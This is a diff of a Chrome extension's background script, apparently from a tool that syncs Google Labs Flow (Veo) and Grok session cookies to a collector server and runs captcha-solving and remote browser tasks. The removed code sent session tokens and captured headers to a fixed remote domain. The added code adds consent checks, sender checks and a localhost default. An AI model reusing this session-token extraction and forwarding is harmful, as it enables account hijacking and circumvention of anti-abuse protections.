@@ -2,6 +2,8 @@
 // BACKGROUND SCRIPT - Service Worker
 // ===================================
 
+importScripts('cookie-sync.js', 'flow-session.js', 'flow-session-chrome.js');
+
 console.log('🔧 Background Script: Started');
 
 // ===================================
@@ -10,17 +12,16 @@ console.log('🔧 Background Script: Started');
 // Chúng ta intercepte để lấy giá trị thực, gửi về Python server.
 // ===================================
 
-const FIXED_API_SERVER = 'https://nathanai.xyz/';
-let API_SERVER = FIXED_API_SERVER;
-
-// Luôn ép extension chỉ trỏ về domain chính, không dùng serverUrl cũ trong storage.
-chrome.storage.sync.set({ serverUrl: FIXED_API_SERVER }).catch(() => { });
+const DEFAULT_API_SERVER = 'http://127.0.0.1:3000';
+let API_SERVER = DEFAULT_API_SERVER;
 
 let _capturedBrowserHeaders = {};
 let _headersSentToServer = false;
 
 chrome.webRequest.onSendHeaders.addListener(
-    (details) => {
+    async (details) => {
+        const settings = await getSettings().catch(() => null);
+        if (!settings?.enabled || settings.operationMode !== 'captcha') return;
         if (_headersSentToServer) return; // Đã gửi rồi, không cần nữa
 
         const target = {};
@@ -39,7 +40,6 @@ chrome.webRequest.onSendHeaders.addListener(
 
         if (target['x_client_data']) {
             _capturedBrowserHeaders = { ..._capturedBrowserHeaders, ...target };
-            console.log('📡 Captured browser headers:', target);
 
             // Gửi về Python server
             fetch(`${API_SERVER}/api/browser-headers`, {
@@ -64,6 +64,7 @@ async function openFlowWhenEnabled() {
     try {
         const settings = await getSettings();
         if (!settings.enabled) return;
+        if (settings.operationMode === 'cookie') return;
 
         const existingTabs = await chrome.tabs.query({ url: '*://labs.google/fx/tools/flow*' });
         if (existingTabs && existingTabs.length > 0) {
@@ -87,24 +88,38 @@ async function openFlowWhenEnabled() {
 const DEFAULT_SETTINGS = {
     autoReload: false, // Tắt tính năng F5 sau mỗi 5 phút (Chuyển sang F5 10 phút nhàn rỗi ở content.js)
     reloadInterval: 5, // minutes
-    enabled: true,
+    enabled: false,
     clearGrecaptcha: false, // New setting
-    serverUrl: 'https://nathanai.xyz/',
+    serverUrl: DEFAULT_API_SERVER,
+    browserTasksEnabled: false,
+    flowSessionSyncEnabled: false,
     operationMode: 'cookie' // 'cookie' = chỉ gửi cookie (không giải captcha), 'captcha' = chỉ giải captcha (không gửi cookie)
 };
 
 // Lấy settings từ storage
 async function getSettings() {
     const result = await chrome.storage.sync.get(DEFAULT_SETTINGS);
-    result.serverUrl = FIXED_API_SERVER;
-    API_SERVER = FIXED_API_SERVER;
+    const server = new URL(flowCollectorOrigin(result.serverUrl || DEFAULT_API_SERVER));
+    if (server.protocol !== 'https:' && !(server.protocol === 'http:' && ['localhost', '127.0.0.1', '[::1]'].includes(server.hostname))) {
+        throw new Error('Collector server must use HTTPS or loopback HTTP');
+    }
+    result.serverUrl = server.origin;
+    const local = await chrome.storage.local.get({ flowSessionConsentOrigin: null });
+    result.flowSessionSelected = result.flowSessionSyncEnabled === true;
+    result.flowSessionSyncEnabled = result.flowSessionSelected && local.flowSessionConsentOrigin === server.origin;
+    API_SERVER = result.serverUrl;
     return result;
 }
 
 // Lưu settings
 async function saveSettings(settings) {
-    await chrome.storage.sync.set({ ...settings, serverUrl: FIXED_API_SERVER });
-    API_SERVER = FIXED_API_SERVER;
+    const server = new URL(flowCollectorOrigin(settings.serverUrl || DEFAULT_API_SERVER));
+    if (server.protocol !== 'https:' && !(server.protocol === 'http:' && ['localhost', '127.0.0.1', '[::1]'].includes(server.hostname))) {
+        throw new Error('Collector server must use HTTPS or loopback HTTP');
+    }
+    await chrome.storage.sync.set({ ...settings, serverUrl: server.origin });
+    await chrome.storage.local.set({ flowSessionConsentOrigin: settings.flowSessionSyncEnabled === true ? server.origin : null });
+    API_SERVER = server.origin;
 }
 
 // Tạo alarm cho auto reload
@@ -220,20 +235,32 @@ let _lastCookieAccount = null; // email từ content.js hoặc tab URL
 
 // Lắng nghe message từ popup hoặc content script (1 listener duy nhất)
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
+    if (request.type === 'CHECK_FLOW_SESSION' || request.type === 'SYNC_FLOW_SESSION') {
+        if (sender.id !== chrome.runtime.id || sender.url !== chrome.runtime.getURL('popup.html')) {
+            sendResponse({ state: 'forbidden' });
+            return false;
+        }
+        syncFlowSession({ checkOnly: request.type === 'CHECK_FLOW_SESSION' }).then(sendResponse)
+            .catch(() => sendResponse({ state: 'unavailable' }));
+        return true;
+    }
     if (request.type === 'GET_SETTINGS') {
-        getSettings().then(sendResponse);
+        getSettings().then(sendResponse).catch(() => sendResponse({ success: false, error: 'invalid_settings' }));
         return true;
     }
 
     if (request.type === 'SAVE_SETTINGS') {
+        if (sender.id !== chrome.runtime.id || sender.url !== chrome.runtime.getURL('popup.html')) {
+            sendResponse({ success: false, error: 'forbidden' });
+            return false;
+        }
         saveSettings(request.settings).then(async () => {
-            API_SERVER = FIXED_API_SERVER;
             await createReloadAlarm();
             if (request.settings.enabled) {
                 await openFlowWhenEnabled();
             }
             sendResponse({ success: true });
-        });
+        }).catch(() => sendResponse({ success: false, error: 'invalid_settings' }));
         return true;
     }
 
@@ -264,8 +291,10 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
 
     // Cookie sync: content.js gửi account email lên
     if (request.type === 'SET_COOKIE_ACCOUNT') {
-        _lastCookieAccount = request.account;
-        console.log(`🍪 Cookie sync account set: ${_lastCookieAccount}`);
+        if (!sender.tab?.url || new URL(sender.tab.url).origin !== 'https://labs.google') {
+            sendResponse({ ok: false });
+            return;
+        }
         pushCookiesToServer();
         sendResponse({ ok: true });
         return true;
@@ -283,8 +312,6 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
                     account = decodeURIComponent(url.hash.substring('#captcha_account='.length));
                 }
                 if (account && !_lastCookieAccount) {
-                    _lastCookieAccount = account;
-                    console.log(`🍪 Auto-detected account from tab URL: ${account}`);
                     // Delay 5s cho trang load xong + cookies được set
                     setTimeout(() => pushCookiesToServer(), 5000);
                 }
@@ -296,8 +323,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
 // Khởi tạo khi extension được install/update
 chrome.runtime.onInstalled.addListener(async (details) => {
     console.log('🎉 Extension installed/updated:', details.reason);
-    const settings = await getSettings();
-    await saveSettings(settings);
+    await getSettings();
     await createReloadAlarm();
     await openFlowWhenEnabled();
 });
@@ -311,14 +337,14 @@ async function detectAccountFromSession() {
     try {
         const resp = await fetch('https://labs.google/fx/api/auth/session', {
             credentials: 'include',
+            cache: 'no-store',
+            signal: AbortSignal.timeout(10000),
         });
         if (!resp.ok) return null;
         const data = await resp.json();
         const email = data?.user?.email;
-        if (email) {
-            _lastCookieAccount = email;
-            console.log(`🍪 Detected account from session: ${email}`);
-            return email;
+        if (typeof email === 'string' && email.includes('@')) {
+            return email.trim().toLowerCase();
         }
     } catch (e) {
         console.warn('🍪 Cannot detect account from session:', e);
@@ -328,33 +354,7 @@ async function detectAccountFromSession() {
 
 // ── Self-bootstrap: detect account ngay khi service worker start ──
 async function _bootstrapCookieAccount() {
-    try {
-        // Thử detect từ URL param trước (backward compat)
-        const tabs = await chrome.tabs.query({});
-        for (const tab of tabs) {
-            if (tab.url && tab.url.includes('labs.google') && tab.url.includes('captcha_account=')) {
-                try {
-                    const url = new URL(tab.url);
-                    let account = url.searchParams.get('captcha_account');
-                    if (account) {
-                        _lastCookieAccount = account;
-                        console.log(`🍪 Bootstrap: detected account=${account} from URL param`);
-                        setTimeout(() => pushCookiesToServer(), 3000);
-                        return;
-                    }
-                } catch (_) { }
-            }
-        }
-        // Fallback: detect từ session API
-        const email = await detectAccountFromSession();
-        if (email) {
-            setTimeout(() => pushCookiesToServer(), 3000);
-            return;
-        }
-        console.log('🍪 Bootstrap: no account detected yet (will retry via alarm)');
-    } catch (e) {
-        console.warn('🍪 Bootstrap error:', e);
-    }
+    return pushCookiesToServer();
 }
 // Chạy bootstrap chỉ khi mode=cookie (captcha mode KHÔNG gửi cookie)
 getSettings().then(s => {
@@ -368,9 +368,8 @@ getSettings().then(s => {
 
 async function extractVeoCookie() {
     try {
-        const cookies = await chrome.cookies.getAll({ domain: 'labs.google' });
-        const sessionCookie = cookies.find(c => c.name === '__Secure-next-auth.session-token');
-        return sessionCookie ? sessionCookie.value : null;
+        const cookies = await chrome.cookies.getAll({ url: 'https://labs.google/fx/api/auth/session', name: '__Secure-next-auth.session-token' });
+        return cookies.length === 1 ? cookies[0].value : null;
     } catch (e) {
         console.warn('🍪 Failed to extract Veo cookie:', e);
         return null;
@@ -398,72 +397,28 @@ async function extractGrokCookies() {
     }
 }
 
+const syncCookieSnapshot = createCookieSync({
+    getSettings,
+    readCookie: extractVeoCookie,
+    resolveAccount: detectAccountFromSession,
+    readGrok: extractGrokCookies,
+    onIdentity: account => { _lastCookieAccount = account; },
+    send: payload => fetch(`${API_SERVER}/api/cookie-sync`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        signal: AbortSignal.timeout(10000),
+    }),
+});
+
+const syncFlowSession = createChromeFlowCollector(getSettings);
+
 async function pushCookiesToServer() {
-    // ── Gate: chỉ chạy ở chế độ Cookie Sync ───────────────────────────────
     const settings = await getSettings();
-    if (settings.operationMode !== 'cookie') {
-        return; // Captcha mode → không gửi cookie
-    }
-
-    // Tự tìm account nếu chưa có
-    if (!_lastCookieAccount) {
-        // Thử URL param trước
-        try {
-            const tabs = await chrome.tabs.query({});
-            for (const tab of tabs) {
-                if (tab.url && tab.url.includes('labs.google') && tab.url.includes('captcha_account=')) {
-                    try {
-                        const url = new URL(tab.url);
-                        const account = url.searchParams.get('captcha_account');
-                        if (account) {
-                            _lastCookieAccount = account;
-                            console.log(`🍪 Auto-detected account from URL: ${account}`);
-                            break;
-                        }
-                    } catch (_) { }
-                }
-            }
-        } catch (_) { }
-    }
-
-    // Fallback: detect từ session API
-    if (!_lastCookieAccount) {
-        await detectAccountFromSession();
-    }
-
-    if (!_lastCookieAccount) {
-        console.log('🍪 No account detected yet');
-        return;
-    }
-
-    const veoCookie = await extractVeoCookie();
-    const grokCookies = await extractGrokCookies();
-
-    if (!veoCookie && !grokCookies) {
-        console.log('🍪 No cookies found to push');
-        return;
-    }
-
-    const payload = {
-        account: _lastCookieAccount,
-    };
-    if (veoCookie) payload.veo_cookie = veoCookie;
-    if (grokCookies) payload.grok_cookies = grokCookies;
-
-    try {
-        const res = await fetch(`${API_SERVER}/api/cookie-sync`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-        });
-        if (res.ok) {
-            console.log(`🍪 ✅ Cookies pushed for ${_lastCookieAccount} (veo=${!!veoCookie}, grok=${!!grokCookies})`);
-        } else {
-            console.warn(`🍪 Server rejected cookie push: ${res.status}`);
-        }
-    } catch (e) {
-        console.warn('🍪 Failed to push cookies to server:', e);
-    }
+    if (settings.flowSessionSelected) return syncFlowSession();
+    const status = await syncCookieSnapshot();
+    await chrome.storage.local.set({ cookieSyncStatus: { ...status, at: Date.now(), flowReady: false } });
+    return status;
 }
 
 // Alarm: đẩy cookie ngay lần đầu, sau đó mỗi 1 giờ (chỉ khi mode=cookie)
@@ -521,6 +476,8 @@ chrome.runtime.onConnect.addListener((port) => {
 // Đánh dấu TẤT CẢ tab labs.google là "quan trọng, không được đóng"
 async function protectAllLabsTabs() {
     try {
+        const settings = await getSettings();
+        if (!settings.enabled || settings.operationMode !== 'captcha') return;
         const tabs = await chrome.tabs.query({ url: '*://labs.google/*' });
         for (const t of tabs) {
             chrome.tabs.update(t.id, { autoDiscardable: false }).catch(() => { });
@@ -530,7 +487,9 @@ async function protectAllLabsTabs() {
 protectAllLabsTabs(); // Chạy ngay khi SW khởi động
 
 // Khi bất kỳ tab labs.google nào load xong → đánh dấu nó luôn
-chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
+    const settings = await getSettings().catch(() => null);
+    if (!settings?.enabled || settings.operationMode !== 'captcha') return;
     if (changeInfo.status === 'complete' && tab.url && tab.url.includes('labs.google')) {
         chrome.tabs.update(tabId, { autoDiscardable: false }).catch(() => { });
     }
@@ -574,7 +533,7 @@ async function getCaptchaWorkerId() {
 async function registerCaptchaWorker() {
     // Gate: chỉ chạy ở chế độ Captcha Solver
     const settings = await getSettings();
-    if (settings.operationMode !== 'captcha') return;
+    if (!settings.enabled || settings.operationMode !== 'captcha') return;
 
     try {
         const tabs = await chrome.tabs.query({ url: '*://labs.google/*' });
@@ -595,7 +554,7 @@ setTimeout(registerCaptchaWorker, 2000);
 setInterval(async () => {
     // Gate: chỉ gửi heartbeat ở chế độ Captcha
     const settings = await getSettings();
-    if (settings.operationMode !== 'captcha') return;
+    if (!settings.enabled || settings.operationMode !== 'captcha') return;
 
     try {
         const tabs = await chrome.tabs.query({ url: '*://labs.google/*' });
@@ -834,7 +793,9 @@ async function captchaPollOnce() {
 }
 
 // ── Idle check: reload labs.google tabs after 10 min idle ──
-function captchaCheckIdle() {
+async function captchaCheckIdle() {
+    const settings = await getSettings().catch(() => null);
+    if (!settings?.enabled || settings.operationMode !== 'captcha') return;
     if (Date.now() - _captchaLastActivity > CAPTCHA_IDLE_RELOAD) {
         _captchaLastActivity = Date.now();
         chrome.tabs.query({ url: '*://labs.google/*' }).then(tabs => {
@@ -1090,7 +1051,7 @@ chrome.tabs.onRemoved.addListener((tabId) => {
 // ── Báo register với server (cookie mode tự register theo _lastCookieAccount) ──
 async function btaskRegister() {
     const settings = await getSettings();
-    if (settings.operationMode !== 'cookie') return;
+    if (!settings.enabled || settings.operationMode !== 'cookie' || !settings.browserTasksEnabled || settings.flowSessionSelected) return;
     if (!_lastCookieAccount) return;
     try {
         await fetch(`${API_SERVER}/browser-task/register`, {
@@ -1297,7 +1258,7 @@ async function btaskExecute(reqId, action, payload) {
 async function btaskPollOnce() {
     if (_btaskPollActive) return;
     const settings = await getSettings();
-    if (settings.operationMode !== 'cookie') return;  // chỉ chạy ở cookie mode
+    if (!settings.enabled || settings.operationMode !== 'cookie' || !settings.browserTasksEnabled || settings.flowSessionSelected) return;
     if (!_lastCookieAccount) return;
 
     _btaskPollActive = true;
